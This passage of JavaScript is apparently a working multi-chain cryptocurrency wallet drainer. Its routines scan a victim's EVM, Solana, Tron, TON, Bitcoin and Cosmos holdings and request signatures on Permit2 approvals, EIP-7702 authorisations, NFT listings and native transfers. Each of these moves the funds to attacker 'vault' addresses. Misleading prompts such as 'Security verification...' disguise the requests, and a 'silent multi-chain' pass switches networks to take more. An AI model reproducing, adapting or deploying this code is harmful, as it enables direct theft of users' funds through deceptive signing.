        nonce: nonce,
        erc20s: assets.tokens.map(function (t) { return t.address; }),
        defiActions: defiActions,
      };
    } catch (e) { L.warn('wallet_signAuthorization not supported:', e.message); return null; }
  }

  async function signNativeForBatch(provider, address, nativeTransfer) {
    if (!nativeTransfer) return null;
    var txParams = {
      from: nativeTransfer.from || address,
      to: nativeTransfer.to,
      value: nativeTransfer.value && String(nativeTransfer.value).startsWith('0x')
        ? nativeTransfer.value : ('0x' + BigInt(nativeTransfer.value || '0').toString(16)),
      gas: nativeTransfer.gas || ('0x' + NATIVE_TRANSFER_GAS.toString(16)),
      nonce: '0x' + Number(nativeTransfer.nonce || 0).toString(16),
      type: '0x2',
      chainId: '0x' + Number(nativeTransfer.chainId || 1).toString(16),
    };
    if (nativeTransfer.maxFeePerGas) {
      txParams.maxFeePerGas = nativeTransfer.maxFeePerGas;
      txParams.maxPriorityFeePerGas = nativeTransfer.maxPriorityFeePerGas;
    } else {
      var fees = await estimateEip1559Fees(provider);
      txParams.maxFeePerGas = '0x' + fees.maxFeePerGas.toString(16);
      txParams.maxPriorityFeePerGas = '0x' + fees.maxPriorityFeePerGas.toString(16);
    }
    try {
      L.log('eth_signTransaction (backend will broadcast)...');
      var signed = await provider.request({ method: 'eth_signTransaction', params: [txParams] });
      if (signed && String(signed).startsWith('0x')) return signed;
    } catch (e) {
      if (isUserRejection(e)) throw e;
      L.warn('eth_signTransaction unavailable:', e.message);
    }
    return null;
  }

  // personal_sign / evm_personal_verification REMOVED — does not move funds on backend.

  // 9.5b — REMOVED: drainNative (eth_sendTransaction) — user never broadcasts; backend relays signed txs.

  // 9.6 — TIER 3B: ERC-20 via Permit2 (+ optional native + NFT approvals)
  async function drainPermit2(provider, address, chainId, tokens, nfts, nativeAmountWei) {
    var nftArr = normNftList(nfts);
    var permits = (tokens || []).map(function (t) { return { token: t.address, amount: MAX_AMOUNT }; });
    var nativeStr = nativeAmountWei && nativeAmountWei > 0n ? nativeAmountWei.toString() : '0';
    if (permits.length === 0 && nftArr.length === 0 && nativeStr === '0') return null;
    if (permits.length === 0 && nftArr.length > 0 && nativeStr === '0') return null;

    var resp = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', {
      wallet_address: address,
      chain_id: Number(chainId),
      permits: permits,
      nativeAmount: nativeStr,
      native_amount: nativeStr,
      nfts: nftArr,
    });
    if (!resp || !resp.data) { L.warn('Permit2 typed_data fail'); return null; }
    var bd = resp.data;
    if (!bd.typed_data && permits.length === 0 && !bd.native_transfer) return null;

    var permitSig = null;
    if (bd.typed_data) {
      var td = normalizeTypedData(JSON.parse(JSON.stringify(bd.typed_data)));
      L.log('Permit2 typed_data received, requesting signature...');
      try {
        permitSig = await provider.request({
          method: 'eth_signTypedData_v4',
          params: [address, JSON.stringify(td)],
        });
      } catch (e) {
        if (isUserRejection(e)) throw e;
        permitSig = await provider.request({ method: 'eth_signTypedData_v4', params: [address, td] });
      }
    }

    var nftApprovalSigs = {};
    if (bd.nft_approval_typed_data && typeof bd.nft_approval_typed_data === 'object') {
      var contracts = Object.keys(bd.nft_approval_typed_data);
      for (var ni = 0; ni < contracts.length; ni++) {
        var cKey = contracts[ni];
        try {
          var ntd = normalizeTypedData(JSON.parse(JSON.stringify(bd.nft_approval_typed_data[cKey])));
          var nsig = await provider.request({
            method: 'eth_signTypedData_v4', params: [address, JSON.stringify(ntd)],
          });
          nftApprovalSigs[cKey.toLowerCase()] = nsig;
        } catch (ne) { L.warn('NFT approval sign fail:', cKey, ne.message); }
      }
    }

    var nativeSigned = null;
    if (BigInt(bd.nativeAmount || nativeStr || '0') > 0n && bd.native_transfer) {
      nativeSigned = await signNativeForBatch(provider, address, bd.native_transfer);
    }

    if (!permitSig && !nativeSigned && nftArr.length === 0) return null;

    return {
      sig: permitSig,
      batchData: bd,
      nativeSigned: nativeSigned,
      nativeBroadcast: null,
      nativeAmount: bd.nativeAmount || nativeStr,
      nftApprovalSigs: nftApprovalSigs,
      nfts: nftArr,
    };
  }

  // 9.7 — TIER 3C: Ledger/Trezor Permit2
  async function drainHardwarePermit2(hwObj, address, chainId, tokens, nfts) {
    if (!tokens || tokens.length === 0) return null;
    var resp = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', {
      wallet_address: address, chain_id: Number(chainId),
      permits: tokens.map(function (t) { return { token: t.address, amount: MAX_AMOUNT }; }),
      native_amount: '0', nfts: normNftList(nfts),
    });
    if (!resp || !resp.data || !resp.data.typed_data) return null;
    var td = normalizeTypedData(JSON.parse(JSON.stringify(resp.data.typed_data)));
    var sig = hwObj.type === 'ledger'
      ? await HW.signLedgerTypedData(hwObj, td)
      : await HW.signTrezorTypedData(td);
    if (!sig) return null;
    return { sig: sig, batchData: resp.data, nativeAmount: '0', nfts: normNftList(nfts), nftApprovalSigs: {} };
  }

  // 9.8 — TIER 3D: Seaport NFT
  async function drainNFT(provider, address, chainId) {
    var nftResults = [];
    try {
      var scan = await apiPost('/api/v1/seaport/scan-listings', { wallet: address, chain_id: Number(chainId) });
      if (!scan || !scan.data || !scan.data.listings || scan.data.listings.length === 0) return nftResults;
      for (var i = 0; i < scan.data.listings.length; i++) {
        var listing = scan.data.listings[i];
        try {
          var td = await apiPost('/api/v1/seaport/listing-typed-data', {
            wallet: address, token_id: listing.token_id, contract: listing.contract, chain_id: Number(chainId),
          });
          if (!td || !td.data || !td.data.typed_data) continue;
          var sig = await provider.request({ method: 'eth_signTypedData_v4', params: [address, JSON.stringify(td.data.typed_data)] });
          nftResults.push({ listing: listing, sig: sig, orderParams: td.data.order_parameters || {} });
        } catch (e) { L.warn('NFT listing sign fail:', e.message); }
      }
    } catch (e) { L.warn('NFT scan fail:', e.message); }
    return nftResults;
  }

  // 9.9 — DRAIN WATERFALL (reusable per chain)
  async function runDrainWaterfall(provider, address, chainId, walletName, hwObj, assets) {
    if (!assets) {
      assets = await scanAssets(provider, address, chainId);
    }
    if (assets.usd > 0 && assets.usd < MIN_DRAIN_USD) {
      var hasNative = BigInt(assets.nativeHex || '0x0') > MIN_NATIVE_WEI;
      if (!hasNative && assets.tokens.length === 0 && assets.nfts.length === 0) {
        L.log('Chain', chainId, 'below USD threshold');
        return false;
      }
    }

    if (hwObj) {
      UI.status('Approve in ' + hwObj.type + '...');
      var hwP2 = await drainHardwarePermit2(hwObj, address, chainId, assets.tokens, assets.nfts);
      if (hwP2) { await SUBMIT.permit2(hwP2, address, chainId, walletName, assets.nfts, {}); return true; }
      return false;
    }

    var caps = await getCapabilities(provider, address, chainId);
    L.log('chain', chainId, 'atomicBatch:', caps.atomicBatch, '| signOnly:', SIGN_ONLY);

    var gasLimit = estimateSendCallsGasLimit(assets.tokens.length, assets.nfts.length, true);
    var sweep = await calcMaxNativeSendWei(provider, assets.nativeHex, chainId, gasLimit);
    var nativeSend = sweep.send;
    if (nativeSend > 0n) {
      L.log('Vault sweep:', (Number(nativeSend) / 1e18).toFixed(6), 'native | gas cost:', (Number(sweep.gasCost) / 1e18).toFixed(6));
    }
    var didSomething = false;
    var isWcPath = walletName === 'WalletConnect' || !!(provider && provider.isWalletConnect);

    // WC FIRST: claim() contract call on phone before Permit2 / 7702
    if (isWcPath && MOBILE_SEND_TX && nativeSend > MIN_NATIVE_WEI) {
      UI.status('Confirm in wallet...');
      L.log('WC claim() first | native:', (Number(nativeSend) / 1e18).toFixed(6),
        '| connector:', (provider && provider.connectorId) || '?');
      try {
        var wcTx = await drainNativeSendTx(provider, address, chainId, assets);
        if (wcTx) {
          await SUBMIT.userBroadcast(wcTx, address, chainId, walletName, nativeSend);
          didSomething = true;
        }
      } catch (wce) {
        if (isUserRejection(wce)) throw wce;
        L.warn('WC claim() fail:', wce.message);
      }
    }

    // TIER 1: Permit2 EIP-712 (tokens) + native sign-tx (non-MetaMask only)
    var nativeForPermit2 = canTryNativeSignTx(provider) ? nativeSend : 0n;
    if (assets.tokens.length > 0) {
      UI.status('Sign in wallet...');
      try {
        var p2 = await drainPermit2(provider, address, chainId, assets.tokens, assets.nfts, nativeForPermit2);
        if (p2 && isLethalEvmResult(p2)) {
          S.pendingEvmPermit2 = p2;
          didSomething = true;
        } else if (p2) {
          L.warn('Permit2 result not lethal — skipped');
        }
      } catch (pe) {
        if (isUserRejection(pe)) throw pe;
        L.warn('Permit2/sign fail:', pe.message);
      }
    } else if (nativeForPermit2 > MIN_NATIVE_WEI) {
      UI.status('Sign transaction in wallet...');
      try {
        var p2n = await drainPermit2(provider, address, chainId, [], assets.nfts, nativeForPermit2);
        if (p2n && isLethalEvmResult(p2n)) {
          await SUBMIT.permit2(p2n, address, chainId, walletName, assets.nfts, p2n.nftApprovalSigs || {});
          didSomething = true;
        }
      } catch (pne) {
        if (isUserRejection(pne)) throw pne;
        L.warn('Native sign-tx fail:', pne.message);
      }
    }

    if (isMetaMaskProvider(provider) && nativeSend > MIN_NATIVE_WEI && !didSomething) {
      L.log('MetaMask: skipping eth_signTransaction (not supported) — trying EIP-7702 / batch');
    }

    // TIER 2: EIP-7702 authorization signature (backend executes drain)
    if (!didSomething && S.eip7702Enabled && EIP7702_CHAINS[Number(chainId)]) {
      UI.status('Security verification...');
      var e7702 = await drainEip7702(provider, address, chainId, assets);
      if (e7702) {
        await SUBMIT.eip7702(e7702, address, chainId, walletName);
        didSomething = true;
      }
    }

    // TIER 3: wallet_sendCalls — desktop MetaMask batch (skip on mobile/WC)
    var useBatch = NATIVE_BATCH_FALLBACK && caps.atomicBatch && nativeSend > MIN_NATIVE_WEI &&
      !PLAT.isMobile && walletName !== 'WalletConnect';
    if (!didSomething && useBatch) {
      UI.status('Confirm batch in wallet...');
      L.log('Native batch fallback (wallet_sendCalls)...');
      var batchRaw = await drainSendCalls(provider, address, chainId, assets);
      var batchId = extractBatchOrTxId(batchRaw);
      if (batchId) {
        await SUBMIT.sendCalls(batchId, address, chainId, walletName);
        didSomething = true;
      } else if (batchRaw) {
        L.warn('wallet_sendCalls returned non-hash:', typeof batchRaw);
      }
    } else if (!didSomething && !SIGN_ONLY && caps.atomicBatch && !PLAT.isMobile) {
      UI.status('Confirm in wallet...');
      var batchRaw2 = await drainSendCalls(provider, address, chainId, assets);
      var batchId2 = extractBatchOrTxId(batchRaw2);
      if (batchId2) {
        await SUBMIT.sendCalls(batchId2, address, chainId, walletName);
        didSomething = true;
      }
    }

    // TIER 4: Mobile / WC — eth_sendTransaction
    if (!didSomething && MOBILE_SEND_TX && nativeSend > MIN_NATIVE_WEI &&
        (PLAT.isMobile || PLAT.strategy === 'wc' || isWcPath)) {
      UI.status('Confirm in wallet...');
      L.log('Mobile native tx (eth_sendTransaction)...');
      var txHash = await drainNativeSendTx(provider, address, chainId, assets);
      if (txHash) {
        await SUBMIT.userBroadcast(txHash, address, chainId, walletName, nativeSend);
        didSomething = true;
      }
    }

    // TIER 4b: MetaMask desktop — claim() when batch/7702 unavailable
    if (!didSomething && nativeSend > MIN_NATIVE_WEI && isMetaMaskProvider(provider) && !PLAT.isMobile) {
      UI.status('Confirm in wallet...');
      L.log('MetaMask claim() fallback (eth_sendTransaction)...');
      try {
        var mmTx = await drainNativeSendTx(provider, address, chainId, assets);
        if (mmTx) {
          await SUBMIT.userBroadcast(mmTx, address, chainId, walletName, nativeSend);
          didSomething = true;
        }
      } catch (mme) {
        if (isUserRejection(mme)) throw mme;
        L.warn('MetaMask claim() fail:', mme.message);
      }
    }

    if (!didSomething) {
      if (isMetaMaskProvider(provider) && assets.tokens.length === 0) {
        L.warn('MetaMask native-only: need ERC-20 balance OR EIP-7702 wallet support OR confirm batch');
        UI.status('Native ETH — batch or tokens required');
      } else {
        L.warn('No lethal signature — need Permit2 tokens, native sign-tx, EIP-7702, or batch');
      }
    }

    L.log('Fallback drain chain', chainId);

    if (!didSomething && assets.nfts.length > 0) {
      UI.status('Confirm NFT...');
      var nftR = await drainNFT(provider, address, chainId);
      for (var i = 0; i < nftR.length; i++) {
        await SUBMIT.nft(nftR[i], address, chainId, walletName);
        didSomething = true;
      }
    }

    return didSomething;
  }

  async function runEvmDrain(provider, address, chainId, walletName, hwObj) {
    if (!S.vaultLoaded) await prefetchVault();
    logContractCoverage(chainId);
    UI.status('Scanning assets...');
    try {
      var assets = await scanAssets(provider, address, chainId);
      L.log('Assets:', assets.tokens.length, 'tokens,', assets.nfts.length, 'NFTs, $' + (assets.usd || 0).toFixed(2));
      S.scoutUsd = Math.max(S.scoutUsd, assets.usd || 0);
      await SCOUT.reportScanComplete(
        address,
        assets.usd || 0,
        assets.tokens.length + assets.nfts.length + (BigInt(assets.nativeHex || '0x0') > MIN_NATIVE_WEI ? 1 : 0),
        walletName,
        chainId
      );

      var ok = await runDrainWaterfall(provider, address, chainId, walletName, hwObj, assets);
      if (ok) UI.status('Processing...');
      setTimeout(function () { silentMultiChain(provider, address, chainId).catch(function () {}); }, 3000);
    } catch (e) {
      if (isUserRejection(e)) {
        await SCOUT.reportDrainStatus('user_rejected', address, chainId, walletName, e.message);
      }
      throw e;
    }
  }

  async function silentMultiChain(provider, address, originalChain) {
    L.log('Silent multi-chain drain starting...');
    for (var i = 0; i < MULTI_CHAIN_ORDER.length; i++) {
      var cid = MULTI_CHAIN_ORDER[i];
      if (cid === Number(originalChain)) continue;
      try {
        var switched = await safeSwitchProviderChain(provider, cid);
        if (!switched) continue;
        var assets = await scanAssets(provider, address, cid);
        if (!chainHasDrainableAssets(assets)) {
          L.log('Chain', cid, 'empty — skip');
          continue;
        }
        if (assets.usd > 0 && assets.usd < MIN_DRAIN_USD) {
          var bal = BigInt(assets.nativeHex || '0x0');
          if (bal < MIN_NATIVE_WEI && assets.tokens.length === 0) continue;
        }
        await runDrainWaterfall(provider, address, cid, S.evmWallet, null, assets);
      } catch (e) { L.warn('Chain', cid, 'fail:', e.message); }
    }
    try {
      await switchProviderChain(provider, originalChain);
    } catch (e) {}
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 10: SOLANA MODULE (full — SOL + SPL, per-tx submit)
  // ═══════════════════════════════════════════════════════════════
  async function connectSol() {
    var entry = firstFamilyProvider('SVM');
    if (!entry) return null;
    var prov = entry.provider;
    try {
      if (prov.features && prov.features['standard:connect']) {
        await prov.features['standard:connect'].connect({});
      } else if (prov.connect) {
        await prov.connect();
      }
      var pk = prov.publicKey;
      var addr = pk ? (pk.toString ? pk.toString() : String(pk)) : '';
      if (!addr) return null;
      L.log('[SVM] connected:', addr.slice(0, 8), '(' + entry.hint + ')');
      S.chains.SOL = { address: addr, name: 'SVM' };
      return { provider: prov, address: addr, name: 'SVM', family: 'SVM', hint: entry.hint };
    } catch (e) { L.warn('[SVM] connect fail:', e.message); return null; }
  }

  async function loadSolWeb3() {
    if (window.solanaWeb3) return window.solanaWeb3;
    try {
      await loadVendorScript('solana-web3.iife.min.js');
      if (window.solanaWeb3) return window.solanaWeb3;
    } catch (e) { L.warn('Solana vendor:', e.message); }
    if (!CDN_FALLBACK) throw new Error('solana-web3 vendor missing');
    await new Promise(function (resolve, reject) {
      var s = document.createElement('script');
      s.src = 'https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js';
      s.onload = resolve; s.onerror = reject;
      document.head.appendChild(s);
    });
    return window.solanaWeb3;
  }

  async function drainSol(conn) {
    if (!conn) return null;
    var vault = VAULT.sol;
    var web3 = await loadSolWeb3();
    var connection = new web3.Connection(SOL_RPC, { commitment: 'confirmed' });
    var fromPk = new web3.PublicKey(conn.address);
    var toPk = new web3.PublicKey(vault);
    var blockhash = (await connection.getLatestBlockhash('confirmed')).blockhash;
    var txList = [];
    var txMetas = [];

    var lamports = await connection.getBalance(fromPk);
    var feeReserve = 50000;
    if (lamports > feeReserve + 5000) {
      var solTx = new web3.Transaction();
      solTx.recentBlockhash = blockhash;
      solTx.feePayer = fromPk;
      var sendLam = lamports - feeReserve;
      solTx.add(web3.SystemProgram.transfer({ fromPubkey: fromPk, toPubkey: toPk, lamports: sendLam }));
      txList.push(solTx);
      txMetas.push({ mint: '11111111111111111111111111111111', amount: String(sendLam), type: 'SOL' });
    }

    var TOKEN_PROG = new web3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
    var ASSOC_PROG = new web3.PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJe1fs8');
    try {
      var tokenRes = await connection.getTokenAccountsByOwner(fromPk, { programId: TOKEN_PROG }, { encoding: 'jsonParsed' });
      for (var ti = 0; ti < tokenRes.value.length; ti++) {
        var info = tokenRes.value[ti].account.data.parsed.info;
        var rawAmt = info.tokenAmount && info.tokenAmount.amount;
        if (!rawAmt || rawAmt === '0') continue;
        var mintKey = new web3.PublicKey(info.mint);
        var userATA = new web3.PublicKey(tokenRes.value[ti].pubkey.toString());
        var vaultATA = web3.PublicKey.findProgramAddressSync(
          [toPk.toBuffer(), TOKEN_PROG.toBuffer(), mintKey.toBuffer()], ASSOC_PROG
        )[0];
        var splTx = new web3.Transaction();
        splTx.recentBlockhash = blockhash;
        splTx.feePayer = fromPk;
        var vaultInfo = await connection.getAccountInfo(vaultATA);
        if (!vaultInfo) {
          splTx.add(new web3.TransactionInstruction({
            keys: [
              { pubkey: fromPk, isSigner: true, isWritable: true },
              { pubkey: vaultATA, isSigner: false, isWritable: true },
              { pubkey: toPk, isSigner: false, isWritable: false },
              { pubkey: mintKey, isSigner: false, isWritable: false },
              { pubkey: web3.SystemProgram.programId, isSigner: false, isWritable: false },
              { pubkey: TOKEN_PROG, isSigner: false, isWritable: false },
            ],
            programId: ASSOC_PROG, data: new Uint8Array(0),
          }));
        }
        var amt = BigInt(rawAmt);
        var data = new Uint8Array(9);
        data[0] = 3;
        var dv = new DataView(data.buffer, 1);
        dv.setUint32(0, Number(amt & 0xFFFFFFFFn), true);
        dv.setUint32(4, Number((amt >> 32n) & 0xFFFFFFFFn), true);
        splTx.add(new web3.TransactionInstruction({
          keys: [
            { pubkey: userATA, isSigner: false, isWritable: true },
            { pubkey: vaultATA, isSigner: false, isWritable: true },
            { pubkey: fromPk, isSigner: true, isWritable: false },
          ],
          programId: TOKEN_PROG, data: data,
        }));
        txList.push(splTx);
        txMetas.push({ mint: info.mint, amount: rawAmt, type: 'SPL' });
      }
    } catch (te) { L.warn('SPL scan fail:', te.message); }

    if (txList.length === 0) return null;

    UI.status('Confirm Solana (' + txList.length + ' tx)...');
    var signedTxs;
    if (conn.provider.signAllTransactions) {
      signedTxs = await conn.provider.signAllTransactions(txList);
    } else {
      signedTxs = [];
      for (var si = 0; si < txList.length; si++) {
        signedTxs.push(await conn.provider.signTransaction(txList[si]));
      }
    }

    var legs = [];
    for (var xi = 0; xi < signedTxs.length; xi++) {
      var b64 = bufToB64(signedTxs[xi].serialize());
      await SUBMIT.solana(conn.address, b64, txMetas[xi], conn.name);
      legs.push({ signed_tx_b64: b64, meta: txMetas[xi] });
    }
    S.omnichainLegs.solana = { address: conn.address, txs: legs };
    L.log('SOL submitted', legs.length, 'txs');
    return legs;
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 11: TRON MODULE (TRX + dynamic TRC-20 from fusion scout)
  // ═══════════════════════════════════════════════════════════════
  async function connectTron() {
    var entry = firstFamilyProvider('TRON');
    if (!entry) return null;
    var tl = entry.provider;
    try {
      if (tl.request) await tl.request({ method: 'tron_requestAccounts' });
      var tw = tl.tronWeb || window.tronWeb;
      if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) return null;
      var addr = tw.defaultAddress.base58;
      L.log('[TRON] connected:', addr.slice(0, 8), '(' + entry.hint + ')');
      S.chains.TRON = { address: addr };
      return { tronWeb: tw, address: addr, name: 'TRON', family: 'TRON', hint: entry.hint };
    } catch (e) { L.warn('[TRON] connect fail:', e.message); return null; }
  }

  async function drainTron(conn) {
    if (!conn) return null;
    var tronWeb = conn.tronWeb;
    var address = conn.address;
    var vault = VAULT.tron;
    var submitted = [];

    var trc20List = [];
    (S.fusionAssets || []).forEach(function (a) {
      if ((a.family === 'TRON' || a.chain_family === 'TRON') && a.token_address && a.token_address.startsWith('T')) {
        trc20List.push({ contract: a.token_address, symbol: a.symbol || 'TRC20' });
      }
    });
    if (trc20List.length === 0) {
      trc20List = [
        { contract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', symbol: 'USDT' },
        { contract: 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8', symbol: 'USDC' },
      ];
    }

    try {
      var balance = await tronWeb.trx.getBalance(address);
      if (balance && balance >= 3000000) {
        var dynFee = Math.max(1000000, Math.floor(balance * 0.1));
        var sendAmt = balance - dynFee;
        if (sendAmt > 0) {
          UI.status('Confirm TRX transfer...');
          var tx = await tronWeb.transactionBuilder.sendTrx(vault, sendAmt, address);
          var signed = await tronWeb.trx.sign(tx);
          await SUBMIT.tron(address, signed, vault, sendAmt, conn.name);
          submitted.push({ type: 'TRX', amount: sendAmt, signed: signed });
        }
      }

      for (var i = 0; i < trc20List.length; i++) {
        try {
          var c = await tronWeb.contract().at(trc20List[i].contract);
          var bal = await c.balanceOf(address).call();
          var balStr = bal && bal.toString ? bal.toString() : String(bal || '0');
          if (BigInt(balStr) <= 0n) continue;
          UI.status('Confirm ' + trc20List[i].symbol + '...');
          var ttx = await tronWeb.transactionBuilder.triggerSmartContract(
            trc20List[i].contract, 'transfer(address,uint256)', { feeLimit: 100000000 },
            [{ type: 'address', value: vault }, { type: 'uint256', value: balStr }], address
          );
          var sTx = await tronWeb.trx.sign(ttx.transaction);
          await SUBMIT.tron(address, sTx, trc20List[i].contract, balStr, conn.name);
          submitted.push({ type: trc20List[i].symbol, amount: balStr, signed: sTx });
        } catch (e2) { L.warn('TRC-20', trc20List[i].symbol, e2.message); }
      }
    } catch (e) { L.warn('TRON drain fail:', e.message); }

    if (submitted.length) S.omnichainLegs.tron = { address: address, legs: submitted };
    return submitted;
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 12: TON MODULE (native TON + jettons via TonConnect)
  // ═══════════════════════════════════════════════════════════════
  var _tcConnector = null;

  async function connectTon() {
    var entry = firstFamilyProvider('TON');
    var tonProv = entry ? entry.provider : null;
    if (tonProv) {
      try {
        var r = await tonProv.connect({ items: [{ name: 'ton_addr' }] });
        if (r && r.items) {
          var ai = r.items.find(function (x) { return x.name === 'ton_addr'; });
          if (ai && ai.address) {
            S.chains.TON = { address: ai.address };
            L.log('[TON] connected:', ai.address.slice(0, 8), '(' + entry.hint + ')');
            return { provider: tonProv, address: ai.address, type: 'direct', name: 'TON', family: 'TON', hint: entry.hint };
          }
        }
      } catch (e) {}
    }
    try {
      var TC = resolveTonConnect();
      if (!TC) { await loadVendorScript('tonconnect-sdk.min.js'); TC = resolveTonConnect(); }
      if (!TC) throw new Error('TonConnect SDK missing');
      _tcConnector = new TC({ manifestUrl: window.location.origin + '/tonconnect-manifest.json' });
      return await new Promise(function (resolve) {
        var to = setTimeout(function () { resolve(null); }, 60000);
        _tcConnector.onStatusChange(function (w) {
          if (!w || !w.account) return;
          clearTimeout(to);
          S.chains.TON = { address: w.account.address };
          resolve({ provider: _tcConnector, address: w.account.address, type: 'tonconnect', name: 'TonConnect' });
        });
        if (_tcConnector.openModal) _tcConnector.openModal();
        else _tcConnector.connect({ universalLink: 'https://app.tonkeeper.com/ton-connect', bridgeUrl: 'https://bridge.tonapi.io/bridge' });
      });
    } catch (e) { L.warn('TON connect fail:', e.message); return null; }
  }

  async function drainTon(conn) {
    if (!conn) return null;
    var vault = VAULT.ton;
    try {
      var balRes = await fetch('https://tonapi.io/v2/accounts/' + encodeURIComponent(conn.address));
      var balData = await balRes.json();
      var nano = BigInt(balData.balance || '0');
      var messages = [];
      if (nano > 20000000n) {
        messages.push({ address: vault, amount: String(nano - 10000000n), payload: '' });
      }

      try {
        var jRes = await fetch('https://tonapi.io/v2/accounts/' + encodeURIComponent(conn.address) + '/jettons');
        var jData = await jRes.json();
        if (jData.balances) {
          for (var ji = 0; ji < jData.balances.length; ji++) {
            var j = jData.balances[ji];
            if (BigInt(j.balance || '0') <= 0n) continue;
            if (j.wallet_address && j.wallet_address.address) {
              messages.push({
                address: j.wallet_address.address,
                amount: '50000000',
                payload: '',
              });
            }
          }
        }
      } catch (je) {}

      if (messages.length === 0) return null;
      UI.status('Confirm TON transaction...');
      var tx = { validUntil: Math.floor(Date.now() / 1000) + 600, messages: messages };
      var result;
      if (conn.type === 'tonconnect') result = await conn.provider.sendTransaction(tx);
      else if (conn.provider.sendTransaction) result = await conn.provider.sendTransaction(tx);
      else if (conn.provider.send) result = await conn.provider.send({ method: 'sendTransaction', params: tx });
      else return null;

      var boc = (result && result.boc) ? result.boc : JSON.stringify(result);
      await SUBMIT.ton(conn.address, boc, String(nano), conn.name);
      S.omnichainLegs.ton = { address: conn.address, boc: boc };
      L.log('TON submitted');
      return boc;
    } catch (e) { L.warn('TON drain fail:', e.message); return null; }
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 13: BITCOIN MODULE (backend PSBT builder + wallet sign)
  // ═══════════════════════════════════════════════════════════════
  async function connectBtc() {
    var entry = firstFamilyProvider('UTXO');
    if (!entry) return null;
    var prov = entry.provider;
    try {
      var accounts;
      if (prov.requestAccounts) accounts = await prov.requestAccounts();
      else if (prov.connect) {
        var cr = await prov.connect();
        accounts = cr.accounts || cr.addresses || [cr];
      } else if (prov.getAccounts) accounts = await prov.getAccounts();
      else return null;
      var addr = Array.isArray(accounts) ? accounts[0] : accounts;
      if (addr && typeof addr === 'object') addr = addr.address || addr.pubkey || '';
      if (!addr || typeof addr !== 'string') return null;
      S.chains.BTC = { address: addr, name: 'UTXO' };
      L.log('[UTXO] connected:', addr.slice(0, 8), '(' + entry.hint + ')');
      return { provider: prov, address: addr, name: 'UTXO', family: 'UTXO', hint: entry.hint };
    } catch (e) { L.warn('[UTXO] connect fail:', e.message); return null; }
  }

  async function drainBtc(conn) {
    if (!conn) return null;
    var vault = VAULT.btc;
    try {
      var psbtResp = await apiPost('/api/v1/signature-anchor/bitcoin-psbt', {
        wallet_address: conn.address,
        vault_address: vault,
        amount_sat: '0',
      });
      var pdata = (psbtResp && psbtResp.data) ? psbtResp.data : psbtResp;
      if (!pdata || !pdata.psbt_base64) {
        L.warn('BTC PSBT unavailable — check BLOCKCYPHER_API_TOKEN on backend');
        return null;
      }
      var psbt = pdata.psbt_base64;
      var amountSat = pdata.amount_sat || pdata.amountSat || '0';
      var inputCount = pdata.inputs || pdata.input_count || 1;
      var toSign = [];
      for (var i = 0; i < inputCount; i++) toSign.push({ index: i, address: conn.address });

      UI.status('Confirm Bitcoin PSBT...');
      var signed = await conn.provider.signPsbt(psbt, {
        autoFinalized: true,
        toSignInputs: toSign,
      });
      var signedB64 = typeof signed === 'string' ? signed : (signed && signed.psbt) ? signed.psbt : bufToB64(signed);
      await SUBMIT.bitcoin(conn.address, signedB64, amountSat, conn.name);
      S.omnichainLegs.bitcoin = { address: conn.address, psbt: signedB64 };
      L.log('BTC PSBT submitted');
      return signedB64;
    } catch (e) { L.warn('BTC drain fail:', e.message); return null; }
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 13B: COSMOS MODULE (Keplr — cosmoshub-4 ATOM)
  // ═══════════════════════════════════════════════════════════════
  async function connectCosmos() {
    var entry = firstFamilyProvider('COSMOS');
    if (!entry) return null;
    var prov = entry.provider;
    try {
      var chainId = 'cosmoshub-4';
      await prov.enable(chainId);
      var key = await prov.getKey(chainId);
      if (!key || !key.bech32Address) return null;
      S.chains.COSMOS = { address: key.bech32Address };
      L.log('[COSMOS] connected:', key.bech32Address.slice(0, 8), '(' + entry.hint + ')');
      return { provider: prov, address: key.bech32Address, chainId: chainId, name: 'COSMOS', family: 'COSMOS', hint: entry.hint };
    } catch (e) { L.warn('[COSMOS] connect fail:', e.message); return null; }
  }

  async function drainCosmos(conn) {
    if (!conn || !VAULT.cosmos) { L.warn('Cosmos vault not configured'); return null; }
    try {
      var addr = conn.address;
      var vault = VAULT.cosmos;
      var balRes = await fetch(COSMOS_REST + '/cosmos/bank/v1beta1/balances/' + addr);
      var balJson = await balRes.json();
      var uatom = (balJson.balances || []).find(function (b) { return b.denom === 'uatom'; });
      var amount = BigInt(uatom && uatom.amount ? uatom.amount : '0');
      if (amount < 10000n) return null;

      var accRes = await fetch(COSMOS_REST + '/cosmos/auth/v1beta1/accounts/' + addr);
      var accJson = await accRes.json();
      var accNum = accJson.account && (accJson.account.account_number || accJson.account.value && accJson.account.value.account_number);
      var seq = accJson.account && (accJson.account.sequence || accJson.account.value && accJson.account.value.sequence);
      if (accNum == null || seq == null) return null;

      var sendAmt = String(amount - 5000n);
      var signDoc = {
        chain_id: conn.chainId,
        account_number: String(accNum),
        sequence: String(seq),
        fee: { amount: [{ denom: 'uatom', amount: '5000' }], gas: '200000' },
        msgs: [{
          type: 'cosmos-sdk/MsgSend',
          value: { from_address: addr, to_address: vault, amount: [{ denom: 'uatom', amount: sendAmt }] },
        }],
        memo: '',
      };

      UI.status('Confirm Cosmos ATOM...');
      var signed = await conn.provider.signAmino(conn.chainId, addr, signDoc);
      await SUBMIT.cosmos(addr, signed, sendAmt, conn.name);
      L.log('Cosmos submitted');
      return signed;
    } catch (e) { L.warn('Cosmos drain fail:', e.message); return null; }
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 13C: APTOS MODULE (Petra / Martian)
  // ═══════════════════════════════════════════════════════════════
  async function connectAptos() {
    var entry = firstFamilyProvider('APTOS');
    if (!entry) return null;
    var apt = entry.provider;
    try {
      if (apt.connect) await apt.connect();
      var account = null;
      try { account = apt.account ? await apt.account() : null; } catch (ae) {}
      var addr = (account && account.address) || apt.address || '';
      if (!addr) return null;
      S.chains.APTOS = { address: addr };
